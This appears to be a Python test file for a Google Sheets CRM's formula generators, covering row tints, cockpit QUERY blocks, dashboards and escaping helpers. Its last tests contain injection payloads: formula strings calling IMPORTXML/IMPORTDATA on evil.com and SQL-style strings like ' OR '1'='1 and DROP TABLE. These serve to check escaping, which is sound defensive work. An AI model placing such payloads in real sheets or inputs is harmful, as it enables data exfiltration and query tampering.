import sys, pathlib
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "engine" / "operator_layer"))
from crm_operator_layer import pipeline_row_tints, PIPELINE_COLORS

def test_row_tint_rules():
    reqs = pipeline_row_tints(sheet_id=123, last_row=6425, last_col=57)
    assert len(reqs) == 7
    r0 = reqs[0]["addConditionalFormatRule"]["rule"]
    assert r0["booleanRule"]["condition"]["type"] == "CUSTOM_FORMULA"
    assert r0["booleanRule"]["condition"]["values"][0]["userEnteredValue"] == '=$BE2="Abgemeldet"'
    rng = r0["ranges"][0]
    assert (rng["startColumnIndex"], rng["endColumnIndex"], rng["startRowIndex"]) == (0, 57, 1)
    assert set(PIPELINE_COLORS) == {"Abgemeldet", "Bounce", "Antwort", "Versendet", "Entwurf", "Freigegeben", "Neu"}

from crm_cockpit import cockpit_blocks, cockpit_values, BLOCK_COLS, BLOCK_ROWS

def test_cockpit_blocks_joel():
    b = cockpit_blocks("Joel")
    assert [x["title"] for x in b] == ["🔴 Abgemeldet", "🟡 Antworten offen", "🟠 Bounce", "🟢 Versendet (zuletzt 40)", "🔵 Heute dran (freigegeben / Entwurf)"]
    assert all("AA contains 'Joel'" in x["formula"] for x in b)
    assert "BE = 'Abgemeldet'" in b[0]["formula"]
    assert "BE = 'Versendet'" in b[3]["formula"] and f"limit {BLOCK_ROWS}" in b[3]["formula"]
    assert BLOCK_COLS == "B, G, I, BE, AP, AR, AC"

def test_cockpit_block_limits_fit_reserved_space():
    """Jeder Block-`limit` muss <= Abstand zur naechsten Titelzeile - 1 bleiben (Critical 3),
    sonst kollidiert die Array-Erweiterung der QUERY mit der Titelzeile des naechsten Blocks."""
    import re
    b = cockpit_blocks("Joel")
    rows = cockpit_values("Joel", "j-cherino@hsb-boden.de")
    title_rows = [i for i, r in enumerate(rows) if r and r[0] in [blk["title"] for blk in b]]
    assert len(title_rows) == len(b)
    title_rows.append(len(rows))  # Sentinel: Ende der Zeilenliste als naechste "Titelzeile"
    for blk, start, nxt in zip(b, title_rows, title_rows[1:]):
        m = re.search(r"limit (\d+)", blk["formula"])
        assert m, blk["title"]
        limit = int(m.group(1))
        # Formel steht in start+2; verfuegbare Ergebniszeilen bis zur naechsten Titelzeile = nxt - start - 2
        assert limit <= nxt - start - 2, (blk["title"], limit, nxt - start - 2)

from crm_cockpit import posteingang_values, KLAER_ROWS

def test_posteingang_blocks():
    v = posteingang_values()
    titles = [r[0] for r in v if r and str(r[0]).startswith(("⚠️", "📥"))]
    assert titles == ["⚠️ Klärfälle — bitte in INBOUND_EVENTS Spalte M eine Lead-ID oder „ignorieren“ eintragen", "📥 Letzte 200 Ereignisse"]
    f = [r[0] for r in v if r and str(r[0]).startswith("=IFERROR(QUERY(INBOUND_EVENTS")]
    assert "J = 'NEEDS_REVIEW'" in f[0] and "order by B desc" in f[0] and f"limit {KLAER_ROWS}" in f[0]
    assert "limit 200" in f[1]

def test_posteingang_klaerfall_block_fits_reserved_space():
    """Der Klaerfall-Block muss mindestens die live beobachteten 149 NEEDS_REVIEW-Zeilen fassen,
    ohne in die Titelzeile der Ereignisliste zu laufen (Critical 3)."""
    v = posteingang_values()
    klaer_title_idx = next(i for i, r in enumerate(v) if r and str(r[0]).startswith("⚠️"))
    events_title_idx = next(i for i, r in enumerate(v) if r and str(r[0]).startswith("📥"))
    reserved = events_title_idx - klaer_title_idx - 1
    assert KLAER_ROWS >= 149
    assert KLAER_ROWS <= reserved - 1

from crm_cockpit import readme_values, readme_table_rows

def test_readme_values():
    rows = readme_values()
    assert len(rows) == 6
    assert rows[0][0].startswith("1. Dein Tab öffnen")
    table = readme_table_rows()
    assert len(table) == 3
    assert [r[0] for r in table] == ["HEUTE JOEL", "HEUTE JORDI", "POSTEINGANG"]

from crm_dashboard import dashboard_rows

def test_dashboard_formulas():
    rows = {r[0]: r for r in dashboard_rows() if r}
    assert rows["Abgemeldet (Opt-out)"][1] == '=COUNTIF(ALL_LEADS!Y2:Y; "yes")'
    assert rows["Bounces"][1] == '=COUNTIF(ALL_LEADS!BE2:BE; "Bounce")'
    assert rows["Antworten offen"][1] == '=COUNTIFS(ALL_LEADS!BE2:BE; "Antwort"; ALL_LEADS!R2:R; "")'
    assert rows["Klärfälle offen"][1] == '=COUNTIF(INBOUND_EVENTS!J2:J; "NEEDS_REVIEW")'
    assert rows["Versendet letzte 30 Tage"][1].startswith("=SPARKLINE(")
    assert "COUNTIFS(" in rows["Versendet letzte 30 Tage"][1]
    assert len(dashboard_rows()) == 27
    assert all(len(r) == 5 for r in dashboard_rows())
    assert rows["ERZEUGTE BATCHES (Letzte 10)"]
    assert dashboard_rows()[17] == [
        '=IF(ISBLANK(BATCHES!A2); ""; BATCHES!A2)',
        '=IF(ISBLANK(BATCHES!B2); ""; BATCHES!B2)',
        '=IF(ISBLANK(BATCHES!D2); ""; BATCHES!D2)',
        '=IF(ISBLANK(BATCHES!F2); ""; BATCHES!F2)',
        '=IF(ISBLANK(BATCHES!K2); ""; BATCHES!K2)',
    ]
    assert dashboard_rows()[26] == [
        '=IF(ISBLANK(BATCHES!A11); ""; BATCHES!A11)',
        '=IF(ISBLANK(BATCHES!B11); ""; BATCHES!B11)',
        '=IF(ISBLANK(BATCHES!D11); ""; BATCHES!D11)',
        '=IF(ISBLANK(BATCHES!F11); ""; BATCHES!F11)',
        '=IF(ISBLANK(BATCHES!K11); ""; BATCHES!K11)',
    ]

import pytest
from crm_cockpit import (
    escape_formula_string,
    escape_query_string_literal,
    q,
    count_formula,
    cockpit_blocks,
    cockpit_values,
)

def test_escape_formula_string():
    assert escape_formula_string('simple') == 'simple'
    assert escape_formula_string('hello "world"') == 'hello ""world""'
    assert escape_formula_string('test"; IMPORTXML("http://evil.com") & "') == 'test""; IMPORTXML(""http://evil.com"") & ""'

def test_escape_query_string_literal():
    assert escape_query_string_literal('Joel') == 'Joel'
    assert escape_query_string_literal("O'Connor") == r"O\'Connor"
    assert escape_query_string_literal("test' OR '1'='1") == r"test\' OR \'1\'=\'1"
    assert escape_query_string_literal(r"test\path'quote") == r"test\\path\'quote"

def test_q_sanitization_and_validation():
    # Test valid q generation
    res = q("BE = 'Abgemeldet'", order="BC desc", limit=10)
    expected = '=IFERROR(QUERY(ALL_LEADS!A2:BE; "select B, G, I, BE, AP, AR, AC where BE = \'Abgemeldet\' order by BC desc limit 10"; 0); "— keine —")'
    assert res == expected

    # Test formula string double quotes escaping inside where clause
    res_quotes = q("AA contains 'Joel\"'")
    assert 'Joel""' in res_quotes

    # Test order validation
    with pytest.raises(ValueError, match="Invalid order clause"):
        q("BE = 'Abgemeldet'", order="BC desc; DROP TABLE LEADS")

    # Test limit validation
    with pytest.raises(ValueError, match="Invalid limit parameter"):
        q("BE = 'Abgemeldet'", limit="invalid")

    with pytest.raises(ValueError, match="Invalid limit parameter"):
        q("BE = 'Abgemeldet'", limit=-5)

def test_security_cockpit_blocks_and_values_injection_prevention():
    # Single quote injection attempt in owner_match
    malicious_owner = "Joel' OR '1'='1"
    blocks = cockpit_blocks(malicious_owner)
    # Ensure single quote is escaped as \'
    assert r"AA contains 'Joel\' OR \'1\'=\'1'" in blocks[0]["formula"]

    # Double quote formula injection attempt in owner_match and mailbox
    formula_inj_owner = 'Joel"; IMPORTXML("http://evil.com", "//a") & "'
    formula_inj_mailbox = 'user@test.de"; IMPORTDATA("http://evil.com") & "'

    counts = [count_formula(formula_inj_owner, "Abgemeldet")]
    assert 'Joel""; IMPORTXML' in counts[0]

    vals = cockpit_values(formula_inj_owner, formula_inj_mailbox)
    # Check that mailbox in VLOOKUP has doubled quotes
    vlookup_str = vals[1][0]
    assert 'user@test.de""; IMPORTDATA' in vlookup_str
